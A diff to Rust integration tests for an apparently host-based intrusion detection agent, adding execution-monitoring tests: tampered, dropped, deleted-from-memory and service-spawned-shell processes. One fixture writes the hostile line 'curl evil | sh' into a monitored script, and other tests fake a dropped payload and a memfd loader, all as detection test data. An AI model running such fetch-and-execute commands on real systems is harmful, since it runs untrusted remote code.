@@ -18,7 +18,7 @@ struct Fixture {
 /// A monitored tree with a script and a config file, an inventory, and an
 /// approved, signed baseline.
 fn fixture() -> Fixture {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = tempdir();
     let root = dir.path().join("root");
     fs::create_dir_all(root.join("bin")).unwrap();
     fs::create_dir_all(root.join("etc")).unwrap();
@@ -38,6 +38,8 @@ fn fixture() -> Fixture {
     config.baseline.signing_key = sk.clone();
     config.baseline.public_key = pk;
     config.alerts.journal = false;
+    // The fixture lives under /tmp; tests that need unusual locations set them.
+    config.execution.unusual_paths = vec![];
 
     let (mut store, _) = Store::create_or_migrate(&db).unwrap();
     let scope = Scope {
@@ -66,6 +68,7 @@ fn quiet() -> Options {
         startup_scan: false,
         settle: Duration::from_millis(50),
         max_delay: Duration::from_millis(500),
+        exec_sensor: false,
         ..Options::default()
     }
 }
@@ -265,7 +268,7 @@ fn critical_scan_checks_baselined_executables() {
 
 #[test]
 fn without_baseline_changes_are_recorded_but_not_alerted() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = tempdir();
     let root = dir.path().join("root");
     fs::create_dir_all(&root).unwrap();
     fs::write(root.join("f"), "1").unwrap();
@@ -290,4 +293,235 @@ fn without_baseline_changes_are_recorded_but_not_alerted() {
         .unwrap();
     assert_eq!(events, 1);
     agent.shutdown();
+}
+
+// ---- Execution monitoring (FR-009..FR-012) ----
+
+use soteria_sensors::audit::ExecEvent;
+
+fn exec_event(pid: u32, ppid: u32, exe: &Path, argv: &[&str]) -> ExecEvent {
+    ExecEvent {
+        time_ms: 1_795_285_908_304,
+        serial: pid as u64,
+        pid,
+        ppid,
+        uid: 1000,
+        euid: 1000,
+        gid: 1000,
+        auid: Some(1000),
+        session: Some(3),
+        tty: Some("pts0".into()),
+        comm: exe.file_name().map(|n| n.to_string_lossy().into_owned()),
+        exe: Some(exe.to_owned()),
+        path: Some(exe.to_owned()),
+        cwd: Some(PathBuf::from("/")),
+        argv: argv.iter().map(|a| a.as_bytes().to_vec()).collect(),
+        key: Some("soteria_exec".into()),
+    }
+}
+
+fn rules(agent: &Agent) -> Vec<String> {
+    alerts(agent).into_iter().map(|a| a.0).collect()
+}
+
+fn root_owned(p: &Path) -> bool {
+    use std::os::unix::fs::MetadataExt;
+    fs::metadata(p).unwrap().uid() == 0 && fs::metadata(p.parent().unwrap()).unwrap().uid() == 0
+}
+
+#[test]
+fn baselined_program_is_trusted() {
+    let f = fixture();
+    let mut agent = start(&f, quiet());
+    let tool = f.root.join("bin/tool");
+    let h = agent
+        .handle_exec(&exec_event(10, 1, &tool, &["tool"]))
+        .unwrap();
+    if root_owned(&tool) {
+        assert_eq!(h.classification, exec::Classification::Trusted);
+        assert!(h.alerts.is_empty());
+    } else {
+        // Unprivileged test run: the file is writable by a non-root user.
+        assert_eq!(h.classification, exec::Classification::Suspicious);
+        assert_eq!(rules(&agent), ["EXE-001"]);
+    }
+    let (class, sha): (String, Option<String>) = agent
+        .store()
+        .connection()
+        .query_row(
+            "SELECT classification, sha256 FROM processes WHERE id = ?1",
+            [h.process_id],
+            |r| Ok((r.get(0)?, r.get(1)?)),
+        )
+        .unwrap();
+    assert_eq!(class, h.classification.as_str());
+    assert!(sha.is_some());
+    agent.shutdown();
+}
+
+#[test]
+fn modified_program_is_known_modified() {
+    let f = fixture();
+    let mut agent = start(&f, quiet());
+    let tool = f.root.join("bin/tool");
+    fs::write(&tool, "#!/bin/sh\ncurl evil | sh\n").unwrap();
+    let h = agent
+        .handle_exec(&exec_event(10, 1, &tool, &["tool"]))
+        .unwrap();
+    assert_eq!(h.classification, exec::Classification::KnownModified);
+    assert_eq!(h.severity, Severity::High);
+    assert!(rules(&agent).contains(&"EXE-002".to_owned()));
+    agent.shutdown();
+}
+
+#[test]
+fn unusual_location_alerts_once() {
+    let mut f = fixture();
+    let drop_dir = f.root.parent().unwrap().join("scratch");
+    fs::create_dir_all(&drop_dir).unwrap();
+    let payload = drop_dir.join("payload");
+    fs::write(&payload, "\x7fELF fake").unwrap();
+    fs::set_permissions(&payload, fs::Permissions::from_mode(0o755)).unwrap();
+    f.config.execution.unusual_paths = vec![drop_dir.clone()];
+    let mut agent = start(&f, quiet());
+
+    let h = agent
+        .handle_exec(&exec_event(
+            20,
+            1,
+            &payload,
+            &["./payload", "--token", "s3cret"],
+        ))
+        .unwrap();
+    assert_eq!(h.classification, exec::Classification::Suspicious);
+    // Unknown and just created: high, not just medium.
+    assert_eq!(h.severity, Severity::High);
+    assert_eq!(rules(&agent), ["EXE-001"]);
+    // Running it again does not raise a second alert.
+    let h2 = agent
+        .handle_exec(&exec_event(21, 1, &payload, &["./payload"]))
+        .unwrap();
+    assert!(h2.alerts.is_empty());
+    assert_eq!(rules(&agent).len(), 1);
+
+    // Arguments are stored redacted by default (NFR-011).
+    let argv: String = agent
+        .store()
+        .connection()
+        .query_row(
+            "SELECT argv FROM processes WHERE id = ?1",
+            [h.process_id],
+            |r| r.get(0),
+        )
+        .unwrap();
+    assert_eq!(argv, r#"["./payload","--token","[REDACTED]"]"#);
+    // The alert evidence names the process.
+    let ev: String = agent
+        .store()
+        .connection()
+        .query_row("SELECT evidence FROM alerts", [], |r| r.get(0))
+        .unwrap();
+    let ev: serde_json::Value = serde_json::from_str(&ev).unwrap();
+    assert_eq!(ev["process"]["pid"], 20);
+    assert_eq!(ev["process"]["auid"], 1000);
+    assert_eq!(ev["classification"], "suspicious");
+    agent.shutdown();
+}
+
+#[test]
+fn deleted_program_is_flagged() {
+    let f = fixture();
+    let mut agent = start(&f, quiet());
+    let h = agent
+        .handle_exec(&exec_event(
+            30,
+            1,
+            Path::new("/var/tmp/.x (deleted)"),
+            &["x"],
+        ))
+        .unwrap();
+    assert_eq!(h.severity, Severity::High);
+    assert!(rules(&agent).contains(&"EXE-003".to_owned()));
+    let h = agent
+        .handle_exec(&exec_event(
+            31,
+            1,
+            Path::new("/memfd:loader (deleted)"),
+            &["loader"],
+        ))
+        .unwrap();
+    assert_eq!(h.classification, exec::Classification::Suspicious);
+    agent.shutdown();
+}
+
+#[test]
+fn service_starting_a_shell_is_flagged_with_lineage() {
+    let f = fixture();
+    let mut agent = start(&f, quiet());
+    let parent = agent
+        .handle_exec(&exec_event(
+            500,
+            1,
+            Path::new("/usr/sbin/nginx"),
+            &["nginx"],
+        ))
+        .unwrap();
+    let shell = ["/bin/sh", "/usr/bin/sh"]
+        .into_iter()
+        .map(Path::new)
+        .find(|p| p.exists())
+        .unwrap();
+    agent
+        .handle_exec(&exec_event(501, 500, shell, &["sh", "-c", "id"]))
+        .unwrap();
+    assert!(
+        rules(&agent).contains(&"EXE-004".to_owned()),
+        "{:?}",
+        rules(&agent)
+    );
+    let parent_id: Option<i64> = agent
+        .store()
+        .connection()
+        .query_row("SELECT parent_id FROM processes WHERE pid = 501", [], |r| {
+            r.get(0)
+        })
+        .unwrap();
+    assert_eq!(parent_id, Some(parent.process_id));
+    agent.shutdown();
+}
+
+#[test]
+fn without_baseline_executions_are_unverified() {
+    let dir = tempdir();
+    let mut config = Config::default();
+    config.general.database = dir.path().join("db");
+    config.paths.include = vec![dir.path().to_owned()];
+    config.execution.unusual_paths = vec![];
+    let (store, _) = Store::create_or_migrate(&config.general.database).unwrap();
+    let mut agent = Agent::start(config, store, quiet()).unwrap();
+    let ls = ["/bin/ls", "/usr/bin/ls"]
+        .into_iter()
+        .map(Path::new)
+        .find(|p| p.exists())
+        .unwrap();
+    let h = agent.handle_exec(&exec_event(40, 1, ls, &["ls"])).unwrap();
+    assert_eq!(h.classification, exec::Classification::Unverified);
+    let limitations: String = agent
+        .store()
+        .connection()
+        .query_row("SELECT limitations FROM processes", [], |r| r.get(0))
+        .unwrap();
+    assert!(
+        limitations.contains("no approved baseline"),
+        "{limitations}"
+    );
+    agent.shutdown();
+}
+
+/// tempfile's default names start with a dot, which counts as a hidden path.
+fn tempdir() -> tempfile::TempDir {
+    tempfile::Builder::new()
+        .prefix("soteria-test")
+        .tempdir()
+        .unwrap()
 }
